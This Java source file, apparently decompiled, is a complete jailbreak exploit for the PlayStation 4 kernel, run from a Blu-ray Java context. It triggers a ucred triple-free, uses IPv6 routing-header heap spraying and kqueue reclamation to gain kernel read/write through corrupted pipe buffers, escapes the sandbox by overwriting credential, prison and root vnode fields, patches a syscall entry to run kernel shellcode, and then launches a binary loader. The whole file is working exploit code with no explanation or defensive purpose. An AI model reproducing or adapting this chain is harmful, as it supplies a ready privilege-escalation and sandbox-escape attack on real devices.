package org.bdj.external;

import java.io.PrintStream;
import org.bdj.api.API;
import org.bdj.api.Buffer;
import org.bdj.api.Int32;
import org.bdj.api.Int32Array;
import org.bdj.api.NativeInvoke;










public class Poops
{
  private static final int AF_UNIX = 1;
  private static final int AF_INET6 = 28;
  private static final int SOCK_STREAM = 1;
  private static final int IPPROTO_IPV6 = 41;
  private static final int IPV6_RTHDR = 51;
  private static final int IPV6_RTHDR_TYPE_0 = 0;
  private static final int UCRED_SIZE = 360;
  private static final int MSG_HDR_SIZE = 48;
  private static final int UIO_IOV_NUM = 20;
  private static final int MSG_IOV_NUM = 23;
  private static final int IOV_SIZE = 16;
  private static final int IPV6_SOCK_NUM = 128;
  private static final int TWIN_TRIES = 15000;
  private static final int UAF_TRIES = 50000;
  private static final int KQUEUE_TRIES = 300000;
  private static final int IOV_THREAD_NUM = 4;
  private static final int UIO_THREAD_NUM = 4;
  private static final int PIPEBUF_SIZE = 24;
  private static final int COMMAND_UIO_READ = 0;
  private static final int COMMAND_UIO_WRITE = 1;
  private static final int PAGE_SIZE = 16384;
  private static final int FILEDESCENT_SIZE = 8;
  private static final int UIO_READ = 0;
  private static final int UIO_WRITE = 1;
  private static final int UIO_SYSSPACE = 1;
  private static final int NET_CONTROL_NETEVENT_SET_QUEUE = 536870915;
  private static final int NET_CONTROL_NETEVENT_CLEAR_QUEUE = 536870919;
  private static final int RTHDR_TAG = 322371584;
  private static final int SOL_SOCKET = 65535;
  private static final int SO_SNDBUF = 4097;
  private static final int F_SETFL = 4;
  private static final int O_NONBLOCK = 4;
  private static long dup;
  private static long close;
  private static long read;
  private static long readv;
  private static long write;
  private static long writev;
  private static long ioctl;
  private static long fcntl;
  private static long pipe;
  private static long kqueue;
  private static long socket;
  private static long socketpair;
  private static long recvmsg;
  private static long getsockopt;
  private static long setsockopt;
  private static long setuid;
  private static long getpid;
  private static long sched_yield;
  private static long cpuset_setaffinity;
  private static long __sys_netcontrol;
  private static Buffer leakRthdr = new Buffer(360);
  private static Int32 leakRthdrLen = new Int32();
  private static Buffer sprayRthdr = new Buffer(360);
  private static Buffer msg = new Buffer(48);
  private static int sprayRthdrLen;
  private static Buffer msgIov = new Buffer(368);
  private static Buffer dummyBuffer = new Buffer(4096);
  private static Buffer tmp = new Buffer(16384);
  private static Buffer victimPipebuf = new Buffer(24);
  private static Buffer uioIovRead = new Buffer(320);
  private static Buffer uioIovWrite = new Buffer(320);
  
  private static Int32Array uioSs = new Int32Array(2);
  private static Int32Array iovSs = new Int32Array(2);
  
  private static IovThread[] iovThreads = new IovThread[4];
  private static UioThread[] uioThreads = new UioThread[4];
  
  private static WorkerState iovState = new WorkerState(4);
  private static WorkerState uioState = new WorkerState(4);
  
  private static int uafSock;
  
  private static int uioSs0;
  
  private static int uioSs1;
  
  private static int iovSs0;
  
  private static int iovSs1;
  private static long kl_lock;
  private static long kq_fdp;
  private static long fdt_ofiles;
  private static long allproc;
  private static int[] twins = new int[2];
  private static int[] triplets = new int[3];
  private static int[] ipv6Socks = new int[128];
  
  private static Int32Array masterPipeFd = new Int32Array(2);
  private static Int32Array victimPipeFd = new Int32Array(2);
  
  private static int masterRpipeFd;
  
  private static int masterWpipeFd;
  
  private static int victimRpipeFd;
  private static int victimWpipeFd;
  private static int previousCore = -1;
  
  private static Kernel.KernelRW kernelRW;
  
  private static PrintStream console;
  
  private static long kBase;
  
  private static API api;

  
  private static int dup(int paramInt) {
    return (int)Helper.api.call(dup, paramInt);
  }
  
  private static int close(int paramInt) {
    return (int)Helper.api.call(close, paramInt);
  }
  
  private static long read(int paramInt, Buffer paramBuffer, long paramLong) {
    return Helper.api.call(read, paramInt, (paramBuffer != null) ? paramBuffer.address() : 0L, paramLong);
  }
  
  private static long readv(int paramInt1, Buffer paramBuffer, int paramInt2) {
    return Helper.api.call(readv, paramInt1, (paramBuffer != null) ? paramBuffer.address() : 0L, paramInt2);
  }
  
  private static long write(int paramInt, Buffer paramBuffer, long paramLong) {
    return Helper.api.call(write, paramInt, (paramBuffer != null) ? paramBuffer.address() : 0L, paramLong);
  }
  
  private static long writev(int paramInt1, Buffer paramBuffer, int paramInt2) {
    return Helper.api.call(writev, paramInt1, (paramBuffer != null) ? paramBuffer.address() : 0L, paramInt2);
  }
  
  private static int ioctl(int paramInt, long paramLong1, long paramLong2) {
    return (int)Helper.api.call(ioctl, paramInt, paramLong1, paramLong2);
  }
  
  private static int fcntl(int paramInt1, int paramInt2, long paramLong) {
    return (int)Helper.api.call(fcntl, paramInt1, paramInt2, paramLong);
  }
  
  private static int pipe(Int32Array paramInt32Array) {
    return (int)Helper.api.call(pipe, (paramInt32Array != null) ? paramInt32Array.address() : 0L);
  }
  
  private static int kqueue() {
    return (int)Helper.api.call(kqueue);
  }
  
  private static int socket(int paramInt1, int paramInt2, int paramInt3) {
    return (int)Helper.api.call(socket, paramInt1, paramInt2, paramInt3);
  }
  
  private static int socketpair(int paramInt1, int paramInt2, int paramInt3, Int32Array paramInt32Array) {
    return (int)Helper.api.call(socketpair, paramInt1, paramInt2, paramInt3, (paramInt32Array != null) ? paramInt32Array.address() : 0L);
  }
  
  private static int recvmsg(int paramInt1, Buffer paramBuffer, int paramInt2) {
    return (int)Helper.api.call(recvmsg, paramInt1, (paramBuffer != null) ? paramBuffer.address() : 0L, paramInt2);
  }
  
  private static int getsockopt(int paramInt1, int paramInt2, int paramInt3, Buffer paramBuffer, Int32 paramInt32) {
    return (int)Helper.api.call(getsockopt, paramInt1, paramInt2, paramInt3, (paramBuffer != null) ? paramBuffer.address() : 0L, (paramInt32 != null) ? paramInt32.address() : 0L);
  }
  
  private static int setsockopt(int paramInt1, int paramInt2, int paramInt3, Buffer paramBuffer, int paramInt4) {
    return (int)Helper.api.call(setsockopt, paramInt1, paramInt2, paramInt3, (paramBuffer != null) ? paramBuffer.address() : 0L, paramInt4);
  }
  
  private static int setuid(int paramInt) {
    return (int)Helper.api.call(setuid, paramInt);
  }
  
  private static int getpid() {
    return (int)Helper.api.call(getpid);
  }
  
  private static int sched_yield() {
    return (int)Helper.api.call(sched_yield);
  }
  
  private static int __sys_netcontrol(int paramInt1, int paramInt2, Buffer paramBuffer, int paramInt3) {
    return (int)Helper.api.call(__sys_netcontrol, paramInt1, paramInt2, (paramBuffer != null) ? paramBuffer.address() : 0L, paramInt3);
  }
  
  private static int cpusetSetAffinity(int paramInt) {
    Buffer buffer = new Buffer(16);
    buffer.putShort(0, (short)(1 << paramInt));
    return cpuset_setaffinity(3, 1, -1L, 16L, buffer);
  }
  
  private static int cpuset_setaffinity(int paramInt1, int paramInt2, long paramLong1, long paramLong2, Buffer paramBuffer) {
    return (int)api.call(cpuset_setaffinity, paramInt1, paramInt2, paramLong1, paramLong2, (paramBuffer != null) ? paramBuffer.address() : 0L);
  }
  public static void cleanup() {
    byte b;
    for (b = 0; b < ipv6Socks.length; b++) {
      close(ipv6Socks[b]);
    }
    close(uioSs1);
    close(uioSs0);
    close(iovSs1);
    close(iovSs0);
    for (b = 0; b < 4; b++) {
      if (iovThreads[b] != null) {
        iovThreads[b].interrupt();
        try {
          iovThreads[b].join();
        } catch (Exception exception) {}
      } 
    } 
    for (b = 0; b < 4; b++) {
      if (iovThreads[b] != null) {
        uioThreads[b].interrupt();
        try {
          uioThreads[b].join();
        } catch (Exception exception) {}
      } 
    } 
    if (previousCore >= 0 && previousCore != 4) {
      
      Helper.pinToCore(previousCore);
      previousCore = -1;
    } 
  }
  
  private static int buildRthdr(Buffer paramBuffer, int paramInt) {
    int i = (paramInt >> 3) - 1 & 0xFFFFFFFE;
    paramBuffer.putByte(0, (byte)0);
    paramBuffer.putByte(1, (byte)i);
    paramBuffer.putByte(2, (byte)0);
    paramBuffer.putByte(3, (byte)(i >> 1));
    return i + 1 << 3;
  }
  
  private static int getRthdr(int paramInt, Buffer paramBuffer, Int32 paramInt32) {
    return getsockopt(paramInt, 41, 51, paramBuffer, paramInt32);
  }
  
  private static int setRthdr(int paramInt1, Buffer paramBuffer, int paramInt2) {
    return setsockopt(paramInt1, 41, 51, paramBuffer, paramInt2);
  }
  
  private static int freeRthdr(int paramInt) {
    return setsockopt(paramInt, 41, 51, null, 0);
  }
  
  private static void buildUio(Buffer paramBuffer, long paramLong1, long paramLong2, boolean paramBoolean, long paramLong3, long paramLong4) {
    paramBuffer.putLong(0, paramLong1);
    paramBuffer.putLong(8, 20L);
    paramBuffer.putLong(16, -1L);
    paramBuffer.putLong(24, paramLong4);
    paramBuffer.putInt(32, 1);
    paramBuffer.putInt(36, paramBoolean ? 1 : 0);
    paramBuffer.putLong(40, paramLong2);
    paramBuffer.putLong(48, paramLong3);
    paramBuffer.putLong(56, paramLong4);
  }
  
  private static Buffer kreadSlow(long paramLong, int paramInt) {
    Buffer[] arrayOfBuffer = new Buffer[4];
    for (byte b1 = 0; b1 < 4; b1++) {
      arrayOfBuffer[b1] = new Buffer(paramInt);
    }
    Int32 int32 = new Int32(paramInt);
    setsockopt(uioSs1, 65535, 4097, (Buffer)int32, int32.size());
    write(uioSs1, tmp, paramInt);
    uioIovRead.putLong(8, paramInt);
    freeRthdr(ipv6Socks[triplets[1]]);
    while (true) {
      uioState.signalWork(0);
      sched_yield();
      leakRthdrLen.set(16);
      getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
      if (leakRthdr.getInt(8) == 20) {
        break;
      }
      read(uioSs0, tmp, paramInt);
      for (byte b = 0; b < 4; b++) {
        read(uioSs0, arrayOfBuffer[b], arrayOfBuffer[b].size());
      }
      uioState.waitForFinished();
      write(uioSs1, tmp, paramInt);
    } 
    long l = leakRthdr.getLong(0);
    buildUio(msgIov, l, 0L, true, paramLong, paramInt);
    freeRthdr(ipv6Socks[triplets[2]]);
    while (true) {
      iovState.signalWork(0);
      sched_yield();
      leakRthdrLen.set(64);
      getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
      if (leakRthdr.getInt(32) == 1) {
        break;
      }
      write(iovSs1, tmp, 1L);
      iovState.waitForFinished();
      read(iovSs0, tmp, 1L);
    } 
    read(uioSs0, tmp, paramInt);
    Buffer buffer = null;
    for (byte b2 = 0; b2 < 4; b2++) {
      read(uioSs0, arrayOfBuffer[b2], arrayOfBuffer[b2].size());
      if (arrayOfBuffer[b2].getLong(0) != 4702111234474983745L) {
        triplets[1] = findTriplet(triplets[0], -1, 50000);
        if (triplets[1] == -1) {
          
          console.println("kreadSlow triplet failure 1");
          return null;
        } 
        buffer = arrayOfBuffer[b2];
      } 
    } 
    uioState.waitForFinished();
    write(iovSs1, tmp, 1L);
    triplets[2] = findTriplet(triplets[0], triplets[1], 50000);
    if (triplets[2] == -1) {
      
      console.println("kreadSlow triplet failure 2");
      return null;
    } 
    iovState.waitForFinished();
    read(iovSs0, tmp, 1L);
    return buffer;
  }
  
  private static boolean kwriteSlow(long paramLong, Buffer paramBuffer) {
    Int32 int32 = new Int32(paramBuffer.size());
    setsockopt(uioSs1, 65535, 4097, (Buffer)int32, int32.size());
    uioIovWrite.putLong(8, paramBuffer.size());
    freeRthdr(ipv6Socks[triplets[1]]);
    while (true) {
      uioState.signalWork(1);
      sched_yield();
      leakRthdrLen.set(16);
      getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
      if (leakRthdr.getInt(8) == 20) {
        break;
      }
      for (byte b1 = 0; b1 < 4; b1++) {
        write(uioSs1, paramBuffer, paramBuffer.size());
      }
      uioState.waitForFinished();
    } 
    long l = leakRthdr.getLong(0);
    buildUio(msgIov, l, 0L, false, paramLong, paramBuffer.size());
    freeRthdr(ipv6Socks[triplets[2]]);
    while (true) {
      iovState.signalWork(0);
      sched_yield();
      leakRthdrLen.set(64);
      getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
      if (leakRthdr.getInt(32) == 1) {
        break;
      }
      write(iovSs1, tmp, 1L);
      iovState.waitForFinished();
      read(iovSs0, tmp, 1L);
    } 
    for (byte b = 0; b < 4; b++) {
      write(uioSs1, paramBuffer, paramBuffer.size());
    }
    triplets[1] = findTriplet(triplets[0], -1, 50000);
    if (triplets[1] == -1) {
      
      console.println("kwriteSlow triplet failure 1");
      return false;
    } 
    uioState.waitForFinished();
    write(iovSs1, tmp, 1L);
    triplets[2] = findTriplet(triplets[0], triplets[1], 50000);
    if (triplets[2] == -1) {
      
      console.println("kwriteSlow triplet failure 2");
      return false;
    } 
    iovState.waitForFinished();
    read(iovSs0, tmp, 1L);
    return true;
  }
  
  public static boolean performSetup() {
    try {
      api = API.getInstance();
      
      dup = Helper.api.dlsym(8193L, "dup");
      close = Helper.api.dlsym(8193L, "close");
      read = Helper.api.dlsym(8193L, "read");
      readv = Helper.api.dlsym(8193L, "readv");
      write = Helper.api.dlsym(8193L, "write");
      writev = Helper.api.dlsym(8193L, "writev");
      ioctl = Helper.api.dlsym(8193L, "ioctl");
      fcntl = Helper.api.dlsym(8193L, "fcntl");
      pipe = Helper.api.dlsym(8193L, "pipe");
      kqueue = Helper.api.dlsym(8193L, "kqueue");
      socket = Helper.api.dlsym(8193L, "socket");
      socketpair = Helper.api.dlsym(8193L, "socketpair");
      recvmsg = Helper.api.dlsym(8193L, "recvmsg");
      getsockopt = Helper.api.dlsym(8193L, "getsockopt");
      setsockopt = Helper.api.dlsym(8193L, "setsockopt");
      setuid = Helper.api.dlsym(8193L, "setuid");
      getpid = Helper.api.dlsym(8193L, "getpid");
      sched_yield = Helper.api.dlsym(8193L, "sched_yield");
      cpuset_setaffinity = Helper.api.dlsym(8193L, "cpuset_setaffinity");
      __sys_netcontrol = Helper.api.dlsym(8193L, "__sys_netcontrol");
      if (dup == 0L || close == 0L || read == 0L || readv == 0L || write == 0L || writev == 0L || ioctl == 0L || fcntl == 0L || pipe == 0L || kqueue == 0L || socket == 0L || socketpair == 0L || recvmsg == 0L || getsockopt == 0L || setsockopt == 0L || setuid == 0L || getpid == 0L || sched_yield == 0L || __sys_netcontrol == 0L || cpuset_setaffinity == 0L) {
        
        console.println("failed to resolve symbols");
        return false;
      } 

      
      sprayRthdrLen = buildRthdr(sprayRthdr, 360);

      
      msg.putLong(16, msgIov.address());
      msg.putLong(24, 23L);
      
      dummyBuffer.fill((byte)65);
      uioIovRead.putLong(0, dummyBuffer.address());
      uioIovWrite.putLong(0, dummyBuffer.address());

      
      previousCore = Helper.getCurrentCore();
      
      if (cpusetSetAffinity(4) != 0) {
        console.println("failed to pin to core");
        return false;
      } 
      
      if (!Helper.setRealtimePriority(256)) {
        console.println("failed realtime priority");
        return false;
      } 

      
      socketpair(1, 1, 0, uioSs);
      uioSs0 = uioSs.get(0);
      uioSs1 = uioSs.get(1);

      
      socketpair(1, 1, 0, iovSs);
      iovSs0 = iovSs.get(0);
      iovSs1 = iovSs.get(1);
      
      byte b;
      for (b = 0; b < 4; b++) {
        iovThreads[b] = new IovThread(iovState);
        iovThreads[b].start();
      } 

      
      for (b = 0; b < 4; b++) {
        uioThreads[b] = new UioThread(uioState);
        uioThreads[b].start();
      } 

      
      for (b = 0; b < ipv6Socks.length; b++) {
        ipv6Socks[b] = socket(28, 1, 0);
      }

      
      for (b = 0; b < ipv6Socks.length; b++) {
        freeRthdr(ipv6Socks[b]);
      }

      
      pipe(masterPipeFd);
      pipe(victimPipeFd);
      
      masterRpipeFd = masterPipeFd.get(0);
      masterWpipeFd = masterPipeFd.get(1);
      victimRpipeFd = victimPipeFd.get(0);
      victimWpipeFd = victimPipeFd.get(1);
      
      fcntl(masterRpipeFd, 4, 4L);
      fcntl(masterWpipeFd, 4, 4L);
      fcntl(victimRpipeFd, 4, 4L);
      fcntl(victimWpipeFd, 4, 4L);
      
      return true;
    } catch (Exception exception) {
      console.println("exception during performSetup");
      return false;
    } 
  }
  
  private static boolean findTwins(int paramInt) {
    while (paramInt-- != 0) {
      byte b; for (b = 0; b < ipv6Socks.length; b++) {
        sprayRthdr.putInt(4, 0x13370000 | b);
        setRthdr(ipv6Socks[b], sprayRthdr, sprayRthdrLen);
      } 
      
      for (b = 0; b < ipv6Socks.length; b++) {
        leakRthdrLen.set(8);
        getRthdr(ipv6Socks[b], leakRthdr, leakRthdrLen);
        int i = leakRthdr.getInt(4);
        int j = i & 0xFFFF;
        if ((i & 0xFFFF0000) == 322371584 && b != j) {
          twins[0] = b;
          twins[1] = j;
          return true;
        } 
      } 
    } 
    return false;
  }
  
  private static int findTriplet(int paramInt1, int paramInt2, int paramInt3) {
    while (paramInt3-- != 0) {
      byte b; for (b = 0; b < ipv6Socks.length; b++) {
        if (b != paramInt1 && b != paramInt2) {

          
          sprayRthdr.putInt(4, 0x13370000 | b);
          setRthdr(ipv6Socks[b], sprayRthdr, sprayRthdrLen);
        } 
      } 
      for (b = 0; b < ipv6Socks.length; b++) {
        if (b != paramInt1 && b != paramInt2) {

          
          leakRthdrLen.set(8);
          getRthdr(ipv6Socks[paramInt1], leakRthdr, leakRthdrLen);
          int i = leakRthdr.getInt(4);
          int j = i & 0xFFFF;
          if ((i & 0xFFFF0000) == 322371584 && j != paramInt1 && j != paramInt2)
            return j; 
        } 
      } 
    } 
    return -1;
  }
  
  private static long kreadSlow64(long paramLong) {
    return kreadSlow(paramLong, 8).getLong(0);
  }
  
  private static void fhold(long paramLong) {
    kwrite32(paramLong + 40L, kread32(paramLong + 40L) + 1);
  }
  
  private static long fget(int paramInt) {
    return kread64(fdt_ofiles + (paramInt * 8));
  }
  
  private static void removeRthrFromSocket(int paramInt) {
    long l1 = fget(paramInt);
    long l2 = kread64(l1 + 0L);
    long l3 = kread64(l2 + 24L);
    long l4 = kread64(l3 + 280L);
    kwrite64(l4 + 104L, 0L);
  }
  
  private static int corruptPipebuf(int paramInt1, int paramInt2, int paramInt3, int paramInt4, long paramLong) {
    if (paramLong == 0L) {
      throw new IllegalArgumentException("buffer cannot be zero");
    }
    victimPipebuf.putInt(0, paramInt1);
    victimPipebuf.putInt(4, paramInt2);
    victimPipebuf.putInt(8, paramInt3);
    victimPipebuf.putInt(12, paramInt4);
    victimPipebuf.putLong(16, paramLong);
    write(masterWpipeFd, victimPipebuf, victimPipebuf.size());
    return (int)read(masterRpipeFd, victimPipebuf, victimPipebuf.size());
  }
  
  public static int kread(Buffer paramBuffer, long paramLong1, long paramLong2) {
    corruptPipebuf((int)paramLong2, 0, 0, 16384, paramLong1);
    return (int)read(victimRpipeFd, paramBuffer, paramLong2);
  }
  
  public static int kwrite(long paramLong1, Buffer paramBuffer, long paramLong2) {
    corruptPipebuf(0, 0, 0, 16384, paramLong1);
    return (int)write(victimWpipeFd, paramBuffer, paramLong2);
  }
  
  public static void kwrite32(long paramLong, int paramInt) {
    tmp.putInt(0, paramInt);
    kwrite(paramLong, tmp, 4L);
  }
  
  public static void kwrite64(long paramLong1, long paramLong2) {
    tmp.putLong(0, paramLong2);
    kwrite(paramLong1, tmp, 8L);
  }
  
  public static long kread64(long paramLong) {
    kread(tmp, paramLong, 8L);
    return tmp.getLong(0);
  }
  
  public static int kread32(long paramLong) {
    kread(tmp, paramLong, 4L);
    return tmp.getInt(0);
  }
  
  private static void removeUafFile() {
    long l = fget(uafSock);
    kwrite64(fdt_ofiles + (uafSock * 8), 0L);
    byte b1 = 0;
    Int32Array int32Array = new Int32Array(2);
    for (byte b2 = 0; b2 < '썐'; b2++) {
      int i = socket(1, 1, 0);
      if (fget(i) == l) {
        kwrite64(fdt_ofiles + (i * 8), 0L);
        b1++;
      } 
      close(i);
      if (b1 == 3) {
        break;
      }
    } 
  }

  
  private static boolean achieveRw(int paramInt) {
    try {
      freeRthdr(ipv6Socks[triplets[1]]);

      
      int i = 0;
      while (paramInt-- != 0) {
        i = kqueue();

        
        leakRthdrLen.set(256);
        getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
        if (leakRthdr.getLong(8) == 21168128L && leakRthdr.getLong(152) != 0L) {
          break;
        }
        close(i);
      } 
      
      if (paramInt <= 0) {
        
        console.println("kqueue realloc failed");
        return false;
      } 
      
      kl_lock = leakRthdr.getLong(96);
      kq_fdp = leakRthdr.getLong(152);
      close(i);

      
      triplets[1] = findTriplet(triplets[0], triplets[2], 50000);
      if (triplets[1] == -1) {
        
        console.println("kqueue triplets 1 failed ");
        return false;
      } 
      
      long l1 = kreadSlow64(kq_fdp);
      fdt_ofiles = l1 + 0L;
      
      long l2 = kreadSlow64(fdt_ofiles + (masterPipeFd.get(0) * 8));
      long l3 = kreadSlow64(fdt_ofiles + (victimPipeFd.get(0) * 8));
      long l4 = kreadSlow64(l2 + 0L);
      long l5 = kreadSlow64(l3 + 0L);
      
      Buffer buffer = new Buffer(24);
      buffer.putInt(0, 0);
      buffer.putInt(4, 0);
      buffer.putInt(8, 0);
      buffer.putInt(12, 16384);
      buffer.putLong(16, l5);
      kwriteSlow(l4, buffer);
      
      fhold(fget(masterPipeFd.get(0)));
      fhold(fget(masterPipeFd.get(1)));
      fhold(fget(victimPipeFd.get(0)));
      fhold(fget(victimPipeFd.get(1)));
      
      for (byte b = 0; b < triplets.length; b++) {
        removeRthrFromSocket(ipv6Socks[triplets[b]]);
      }
      
      removeUafFile();
    } catch (Exception exception) {
      
      console.println("exception during stage 1");
      return false;
    } 
    return true;
  }
  
  private static long pfind(int paramInt) {
    long l = kread64(allproc);
    while (l != 0L && 
      kread32(l + 176L) != paramInt)
    {
      
      l = kread64(l + 0L);
    }
    return l;
  }
  
  private static long getPrison0() {
    long l1 = pfind(0);
    long l2 = kread64(l1 + 64L);
    return kread64(l2 + 48L);
  }

  
  private static long getRootVnode(int paramInt) {
    long l1 = pfind(0);
    long l2 = kread64(l1 + 72L);
    return kread64(l2 + paramInt);
  }


  
  private static boolean escapeSandbox() {
    Int32Array int32Array = new Int32Array(2);
    pipe(int32Array);
    
    Int32 int32 = new Int32();
    int i = getpid();
    int32.set(i);
    ioctl(int32Array.get(0), 2147772028L, int32.address());
    
    long l1 = fget(int32Array.get(0));
    long l2 = kread64(l1 + 0L);
    long l3 = kread64(l2 + 208L);
    long l4 = kread64(l3);
    long l5 = l4;

    
    while ((l5 & 0xFFFFFFFF00000000L) != -4294967296L) {
      l5 = kread64(l5 + 8L);
    }
    
    allproc = l5;
    
    close(int32Array.get(1));
    close(int32Array.get(0));
    
    kBase = kl_lock - KernelOffset.getPS4Offset("KL_LOCK");
    
    long l6 = 64L;
    long l7 = kread64(l4 + 72L);
    long l8 = kread64(l4 + l6);
    
    if (l7 >>> 48L != 65535L) {
      console.print("bad procfd");
      return false;
    } 
    if (l8 >>> 48L != 65535L) {
      console.print("bad ucred");
      return false;
    } 
    
    kwrite32(l8 + 4L, 0);
    kwrite32(l8 + 8L, 0);
    kwrite32(l8 + 12L, 0);
    kwrite32(l8 + 16L, 1);
    kwrite32(l8 + 20L, 0);
    
    long l9 = getPrison0();
    if (l9 >>> 48L != 65535L) {
      console.print("bad prison0");
      return false;
    } 
    kwrite64(l8 + 48L, l9);

    
    kwrite64(l8 + 96L, -1L);
    kwrite64(l8 + 104L, -1L);
    
    long l10 = getRootVnode(16);
    if (l10 >>> 48L != 65535L) {
      console.print("bad rootvnode");
      return false;
    } 
    kwrite64(l7 + 16L, l10);
    kwrite64(l7 + 24L, l10);
    return true;
  }
  
  private static boolean triggerUcredTripleFree() {
    try {
      Buffer buffer1 = new Buffer(8);
      Buffer buffer2 = new Buffer(8);
      msgIov.putLong(0, 1L);
      msgIov.putLong(8, 1L);
      int i = socket(1, 1, 0);
      buffer1.putInt(0, i);
      __sys_netcontrol(-1, 536870915, buffer1, buffer1.size());
      close(i);
      setuid(1);
      uafSock = socket(1, 1, 0);
      setuid(1);
      buffer2.putInt(0, uafSock);
      __sys_netcontrol(-1, 536870919, buffer2, buffer2.size()); char c;
      for (c = Character.MIN_VALUE; c < ' '; c++) {
        iovState.signalWork(0);
        sched_yield();
        write(iovSs1, tmp, 1L);
        iovState.waitForFinished();
        read(iovSs0, tmp, 1L);
      } 
      close(dup(uafSock));
      if (!findTwins(15000)) {
        
        console.println("twins failed");
        return false;
      } 
      
      freeRthdr(ipv6Socks[twins[1]]);
      c = '썐';
      while (c-- > '\000') {
        iovState.signalWork(0);
        sched_yield();
        leakRthdrLen.set(8);
        getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);
        if (leakRthdr.getInt(0) == 1) {
          break;
        }
        write(iovSs1, tmp, 1L);
        iovState.waitForFinished();
        read(iovSs0, tmp, 1L);
      } 
      if (c <= '\000') {
        
        console.println("iov reclaim failed");
        return false;
      } 
      triplets[0] = twins[0];
      close(dup(uafSock));
      triplets[1] = findTriplet(triplets[0], -1, 50000);
      if (triplets[1] == -1) {
        
        console.println("triplets 1 failed");
        return false;
      } 
      write(iovSs1, tmp, 1L);
      triplets[2] = findTriplet(triplets[0], triplets[1], 50000);
      if (triplets[2] == -1) {
        
        console.println("triplets 2 failed");
        return false;
      } 
      iovState.waitForFinished();
      read(iovSs0, tmp, 1L);
    } catch (Exception exception) {
      
      console.println("exception during stage 0");
      return false;
    } 
    return true;
  }
  
  private static boolean applyKernelPatchesPS4() {
    try {
      byte[] arrayOfByte = KernelOffset.getKernelPatchesShellcode();
      if (arrayOfByte.length == 0) {
        return false;
      }
      
      long l1 = kBase + KernelOffset.getPS4Offset("SYSENT_661_OFFSET");
      long l2 = 39192625152L;
      long l3 = 39293288448L;
      
      int i = kread32(l1);
      long l4 = kread64(l1 + 8L);
      int j = kread32(l1 + 44L);
      kwrite32(l1, 2);
      kwrite64(l1 + 8L, kBase + KernelOffset.getPS4Offset("JMP_RSI_GADGET"));
      kwrite32(l1 + 44L, 1);
      
      byte b1 = 1;
      byte b2 = 2;
      byte b3 = 4;
      int k = b1 | b2;
      int m = b1 | b2 | b3;
      
      int n = 65536;
      
      long l5 = Helper.syscall(533, 0L, n, m);
      
      long l6 = Helper.syscall(534, l5, k);
      
      Helper.syscall(477, l3, n, k, 17L, l6, 0L);
      for (byte b4 = 0; b4 < arrayOfByte.length; b4++) {
        api.write8(l3 + b4, arrayOfByte[b4]);
      }
      
      Helper.syscall(477, l2, n, m, 17L, l5, 0L);
      Helper.syscall(661, l2);
      kwrite32(l1, i);
      kwrite64(l1 + 8L, l4);
      kwrite32(l1 + 44L, j);
      Helper.syscall(6, l6);
    } catch (Exception exception) {}


    
    return true;
  }
  
  public static int main(PrintStream paramPrintStream) {
    console = paramPrintStream;

    
    if (Helper.isJailbroken()) {
      NativeInvoke.sendNotificationRequest("Already Jailbroken");
      return 0;
    } 

    
    console.println("Pre-configuration");
    if (!performSetup()) {
      
      console.println("pre-config failure");
      cleanup();
      return -3;
    } 
    console.println("Initial triple free");
    if (!triggerUcredTripleFree()) {
      paramPrintStream.println("triple free failed");
      cleanup();
      return -4;
    } 

    
    if (!achieveRw(300000)) {
      paramPrintStream.println("Leak / RW failed");
      cleanup();
      return -6;
    } 
    
    console.println("Escaping sandbox");
    if (!escapeSandbox()) {
      paramPrintStream.println("Escape sandbox failed");
      cleanup();
      return -7;
    } 
    
    console.println("Patching system");
    if (!applyKernelPatchesPS4()) {
      paramPrintStream.println("Applying patches failed");
      cleanup();
      return -8;
    } 
    
    cleanup();
    
    BinLoader.start();
    
    return 0;
  }
  
  static class IovThread extends Thread { private final Poops.WorkerState state;
    
    public IovThread(Poops.WorkerState param1WorkerState) {
      this.state = param1WorkerState;
    }
    public void run() {
      Poops.cpusetSetAffinity(4);
      Helper.setRealtimePriority(256);
      try {
        while (true) {
          this.state.waitForWork();
          Poops.recvmsg(Poops.iovSs0, Poops.msg, 0);
          this.state.signalFinished();
        } 
      } catch (InterruptedException interruptedException) {
        return;
      } 
    } }
  
  static class UioThread extends Thread {
    private final Poops.WorkerState state;
    
    public UioThread(Poops.WorkerState param1WorkerState) {
      this.state = param1WorkerState;
    }
    public void run() {
      Poops.cpusetSetAffinity(4);
      Helper.setRealtimePriority(256);
      try {
        while (true) {
          int i = this.state.waitForWork();
          if (i == 0) {
            Poops.writev(Poops.uioSs1, Poops.uioIovRead, 20);
          } else if (i == 1) {
            Poops.readv(Poops.uioSs0, Poops.uioIovWrite, 20);
          } 
          this.state.signalFinished();
        } 
      } catch (InterruptedException interruptedException) {
        return;
      } 
    }
  }
  
  static class WorkerState {
    private final int totalWorkers;
    private int workersStartedWork = 0;
    private int workersFinishedWork = 0;
    
    private int workCommand = -1;
    
    public WorkerState(int param1Int) {
      this.totalWorkers = param1Int;
    }
    
    public synchronized void signalWork(int param1Int) {
      this.workersStartedWork = 0;
      this.workersFinishedWork = 0;
      this.workCommand = param1Int;
      notifyAll();
      
      while (this.workersStartedWork < this.totalWorkers) {
        try {
          wait();
        } catch (InterruptedException interruptedException) {}
      } 
    }


    
    public synchronized void waitForFinished() {
      while (this.workersFinishedWork < this.totalWorkers) {
        try {
          wait();
        } catch (InterruptedException interruptedException) {}
      } 


      
      this.workCommand = -1;
    }
    
    public synchronized int waitForWork() throws InterruptedException {
      while (this.workCommand == -1 || this.workersFinishedWork != 0) {
        wait();
      }
      
      this.workersStartedWork++;
      if (this.workersStartedWork == this.totalWorkers) {
        notifyAll();
      }
      
      return this.workCommand;
    }
    
    public synchronized void signalFinished() {
      this.workersFinishedWork++;
      if (this.workersFinishedWork == this.totalWorkers)
        notifyAll(); 
    }
  }
}
